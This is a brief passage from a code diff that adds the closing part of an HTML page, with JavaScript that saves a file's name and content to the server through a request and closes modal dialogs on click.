+        } else {
+            alert('❌ Save failed!');
+        }
+    };
+    xhr.send('a=save&f=' + encodeURIComponent(filename) + '&c=' + encodeURIComponent(content));
+}
+
+window.onclick = function(e) {
+    if (e.target.classList && e.target.classList.contains('modal')) {
+        e.target.style.display = 'none';
+    }
+}
+</script>
+
+</body>
+</html> 
